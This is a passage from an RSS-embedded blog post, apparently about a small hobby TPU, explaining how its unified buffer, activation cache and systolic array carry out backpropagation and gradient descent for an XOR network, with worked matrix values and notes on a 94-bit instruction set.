encoding="application/x-tex">\frac{\partial \mathbf{H}}{\partial \mathbf{W}}</annotation></semantics></math></span></span></span>,<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">H</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">X</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}}{\partial \mathbf{X}}</annotation></semantics></math></span></span></span>, and<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">H</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">b</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}}{\partial \mathbf{b}}</annotation></semantics></math></span></span></span>, respectively, and we can multiply all of these by<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">H</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{H}}</annotation></semantics></math></span></span></span> <!-- -->to get the gradients of the loss with respect to all of our second layer parameters. And because all of the gradients are actually gradient matrices, we can use the systolic array!</p><p>Now something to note about the activation derivative<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}_2}{\partial \mathbf{Z}_2}</annotation></semantics></math></span></span></span> <!-- -->and the weight derivative<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">Z</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">W</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{Z}}{\partial \mathbf{W}}</annotation></semantics></math></span></span></span> <!-- -->is that they both require the post-activations (H) we calculate during forward pass. This means we need to store the outputs of every layer in some form of memory to be able to perform training. Here's where we created a new scratchpad memory module<sup><a href="#fn7" id="fn7-ref">[7]</a></sup> <!-- -->which we called the unified buffer (UB).<sup><a href="#fn8" id="fn8-ref">[8]</a></sup> <!-- -->This lets us store our H values immediately after we compute them during forward pass.</p><p>We realized that we can also get rid of the input and weight accumulators, as well as manually loading the bias and leak factors into their respective modules, by using the UB to store them. This is also better practice, rather than loading in new data every clock cycle with the instruction set. Since we want to access two values (2 inputs or 2 weights for each row/col of the systolic array) at the same time, we added TWO read and write ports. We did this for each data primitive (inputs, weights, bias, leak factor, post activations) to minimize data contention since we have many different types of data.</p><p>To read values, we supply a starting address and the number of values, we supply a starting address and the number of locations we want the UB to read and it will read 2 values every clock cycle. Writing is a similar mechanism, where we specify which values we want to write to each of the two input ports. The beauty in the read mechanism is that it runs in the background once we supply a starting address until the number of locations given are read, meaning we only need to provide an instruction for this every few clock cycles.</p><figure><p><img alt="Unified Buffer diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/ub-diagram.svg"></p><figcaption>Unified Buffer (UB) architecture showing dual-port read mechanism</figcaption></figure><figure><p><img alt="Unified Buffer waveform" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/ub-waveform.svg"></p><figcaption>Unified Buffer timing waveform showing read operation</figcaption></figure><p>At the end of the day, not having these mechanisms wouldn't break the TPU — but they allow us to always keep the systolic array fed, which is a core design principle we couldn't compromise.</p><p>While we were working on this, we realized we could make one last small optimization for the activation derivative module — since we only use the <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{H}_2</annotation></semantics></math></span></span></span> values once (for computing<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}_2}{\partial \mathbf{Z}_2}</annotation></semantics></math></span></span></span>), we created a tiny cache within the VPU instead of storing them in the UB. The rest of the <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">H</mi></mrow><annotation encoding="application/x-tex">\mathbf{H}</annotation></semantics></math></span></span></span> values will be stored in the UB because they're needed to compute multiple derivatives.</p><figure><p><img alt="H-cache diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/h-cache.svg"></p><figcaption>H-cache optimization for storing temporary activation values</figcaption></figure><p>This is what the new TPU architecture, modified to perform training, looks like:</p><figure><p><img alt="Complete TPU architecture" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/tpu.svg"></p><figcaption>Complete TPU architecture showing all components for both inference and training</figcaption></figure><p>Now we can do backpropagation!</p><p>Going back to the computational graph, we discovered something remarkable: the longest chain in backpropagation closely resembles forward pass! In forward pass, we multiply activation matrices with transposed weight matrices. In backward pass, we multiply gradient matrices with weight matrices (untransposed). It's like looking in a mirror!</p><figure><p><img alt="Forward pass diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/forward-pass.svg"></p><figcaption>Forward pass computation flow showing matrix operations</figcaption></figure><p>This insight led us to compute the long chain of the computational graph first (highlighted in yellow) – getting all our<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mi>n</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_n}</annotation></semantics></math></span></span></span> <!-- -->gradients just like we computed activations in forward pass. We could cache these gradients and reuse them, following the same efficient pattern we'd already mastered.</p><p>We create a loop where we:</p><ol><li>Fetch a bridge node (<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mi>n</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_n}</annotation></semantics></math></span></span></span>) from our unified buffer</li><li>Fetch the corresponding <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold">H</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{H}_n</annotation></semantics></math></span></span></span> <!-- -->matrix, also from unified buffer</li><li>Stream these through our systolic array to compute the weight gradients</li></ol><div><h3>Backward pass through second hidden layer</h3><p><span>clk <!-- -->0</span></p></div><p>And here's where something really magical happens: we can stream these weight gradients directly into a gradient descent module while we're still computing them! This module takes the current weights stored in memory and updates them using the gradients.</p><div><p>The gradient descent update rule:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold-italic">θ</mi><mtext>new</mtext></msub><mo>=</mo><msub><mi mathvariant="bold-italic">θ</mi><mtext>old</mtext></msub><mo>−</mo><mi>α</mi><msub><mi mathvariant="normal">∇</mi><mi mathvariant="bold-italic">θ</mi></msub><mi mathvariant="script">L</mi></mrow><annotation encoding="application/x-tex">\bm{\theta}_{\text{new}} = \bm{\theta}_{\text{old}} - \alpha \nabla_{\bm{\theta}} \mathcal{L}</annotation></semantics></math></span></span></span></p></div><p>where <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span></span></span> is the learning rate and<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">θ</mi></mrow><annotation encoding="application/x-tex">\bm{\theta}</annotation></semantics></math></span></span></span> represents any parameter (weights or biases)</p></div><div><p>Computing weight gradients for our XOR network:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">W</mi><mn>2</mn></msub></mrow></mfrac><mo>=</mo><msup><mrow><mo fence="true">(</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub></mrow></mfrac><mo fence="true">)</mo></mrow><mi>T</mi></msup><msub><mi mathvariant="bold">H</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{W}_2} = \left(\frac{\partial \mathcal{L}}{\partial \mathbf{z}_2}\right)^T \mathbf{H}_1</annotation></semantics></math></span></span></span></p></div><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2808</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.2328</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.1664</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.3200</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.2470</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1890</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.5366</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6124</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0977</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2803</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.3873</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.7037</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0521</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0891</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">= \begin{bmatrix} \phantom{-}0.2808\phantom{0} &amp; -0.2328\phantom{0} &amp; -0.1664\phantom{0} &amp; \phantom{-}0.3200\phantom{0} \end{bmatrix} \begin{bmatrix} -0.2470\phantom{0} &amp; \phantom{-}0.1890\phantom{0} \\[0.5em] -0.5366\phantom{0} &amp; \phantom{-}0.6124\phantom{0} \\[0.5em] -0.0977\phantom{0} &amp; \phantom{-}0.2803\phantom{0} \\[0.5em] -0.3873\phantom{0} &amp; \phantom{-}0.7037\phantom{0} \end{bmatrix} = \begin{bmatrix} -0.0521\phantom{0} &amp; \phantom{-}0.0891\phantom{0} \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Similarly for Layer 1:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">W</mi><mn>1</mn></msub></mrow></mfrac><mo>=</mo><msup><mrow><mo fence="true">(</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub></mrow></mfrac><mo fence="true">)</mo></mrow><mi>T</mi></msup><mi mathvariant="bold">X</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0531</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0920</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0138</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0404</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{W}_1} = \left(\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_1}\right)^T \mathbf{X} = \begin{bmatrix} \phantom{-}0.0531\phantom{0} &amp; \phantom{-}0.0920\phantom{0} \\[0.5em] \phantom{-}0.0138\phantom{0} &amp; -0.0404\phantom{0} \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Bias gradients (sum over samples):</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">b</mi><mn>2</mn></msub></mrow></mfrac><mo>=</mo><mn>0.2017</mn><mo separator="true">,</mo><mspace width="1em"></mspace><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">b</mi><mn>1</mn></msub></mrow></mfrac><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0531</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0138</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{b}_2} = 0.2017, \quad \frac{\partial \mathcal{L}}{\partial \mathbf{b}_1} = \begin{bmatrix} \phantom{-}0.0531\phantom{0} \\[0.5em] \phantom{-}0.0138\phantom{0} \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Applying gradient descent with learning rate<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mn>0.75</mn></mrow><annotation encoding="application/x-tex">\alpha = 0.75</annotation></semantics></math></span></span></span>:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi mathvariant="bold">W</mi><mn>2</mn><mtext>new</mtext></msubsup><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5266</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2958</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>−</mo><mn>0.75</mn><mo>⋅</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0521</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0891</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5657</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2290</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{W}_2^{\text{new}} = \begin{bmatrix} \phantom{-}0.5266\phantom{0} &amp; \phantom{-}0.2958\phantom{0} \end{bmatrix} - 0.75 \cdot \begin{bmatrix} -0.0521\phantom{0} &amp; \phantom{-}0.0891\phantom{0} \end{bmatrix} = \begin{bmatrix} \phantom{-}0.5657\phantom{0} &amp; \phantom{-}0.2290\phantom{0} \end{bmatrix}</annotation></semantics></math></span></span></span></p></div></div><p>No waiting around — everything flows like water through our pipeline.</p><p>You might be wondering: "We've used our matrix multiplication identities for the long chain and weight gradients — how do we calculate bias gradients?" Well, we've actually already done most of the work! Since we're processing batches of data, we can simply sum (the technical term is "reduce") the<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mi>n</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_n}</annotation></semantics></math></span></span></span> <!-- -->gradients across the batch dimension. The beauty is that we can do this reduction right when we're computing the long chain — no extra work required!</p><p>With all these new changes and control flags, our instruction is significantly longer — 94 bits in fact! But we can confirm that every single one of these bits is needed and we ensured that we couldn't make the instruction set any smaller without compromising the speed and efficiency of the TPU.</p><figure><div><p><img alt="Instruction Set Architecture diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/isa.svg"></p></div><figcaption>94-bit Instruction Set Architecture (ISA) layout showing control flags and data fields</figcaption></figure><h3>Putting it all together</h3><p>By continuing this same process iteratively – forward pass, backward pass, weight updates – we can train our network until it performs exactly how we want. The same systolic array that powered our inference now powers our training, with just a few additional modules to handle the gradient computations.</p><p>What started as a simple idea about matrix multiplication has grown into a complete training system. Every component works together in harmony: data flows through pipelines, modules operate in parallel, and our systolic array stays fed with useful work.</p><figure><p><img alt="Final waveform simulation results" loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" srcset="https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=640&amp;q=75 640w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=750&amp;q=75 750w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=828&amp;q=75 828w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=1080&amp;q=75 1080w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=1200&amp;q=75 1200w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=1920&amp;q=75 1920w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=2048&amp;q=75 2048w, https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=3840&amp;q=75 3840w" src="https://www.tinytpu.com/_next/image?url=%2Ffinal-waveform.png&amp;w=3840&amp;q=75"></p><figcaption>Final waveform simulation in GTKWave showing the weight and bias updates in memory after one epoch!</figcaption></figure></div><p id="fn2">[2] Fun fact: the name of the systolic array is actually inspired by the human heart — just as systolic blood pressure is created by coordinated heart contractions that push blood through the cardiovascular system in waves, a systolic array processes data through coordinated computational "beats" that push information through the processing elements in waves.<!-- --> <a href="#fn2-ref">↩ back</a></p><p id="fn3">[3] This is a weight-stationary systolic array, which means the weights for each layer are stationary within their respective PEs and don't move around. However, there is a non-weight-stationary systolic array where the weights move along with the inputs, which has its own advantages and disadvantages.<!-- --> <a href="#fn3-ref">↩ back</a></p><p id="fn4">[4] Many illustrations online that depict staggering are actually flat out wrong because they pad consecutive rows with zeros, insetad of delaying them by a clock cycle. While this still gets the correct output, it wastes memory because we would have to store additional zeros that we don't use.<!-- --> <a href="#fn4-ref">↩ back</a></p><p id="fn5">[5] We chose Leaky ReLU over ReLU because we found that since we have a very small network, the model wasn't training properly when we used ReLU — it needed more non-linearity.<!-- --> <a href="#fn5-ref">↩ back</a></p><p id="fn7">[7] A scratchpad memory is a large bank of registers (each of which can store individual values) that lets us access any register we want. A FIFO for example is NOT a scratchpad memory since you can only access the first element in the queue.<!-- --> <a href="#fn7-ref">↩ back</a></p></div>]]></description>
        </item>
    </channel>
</rss>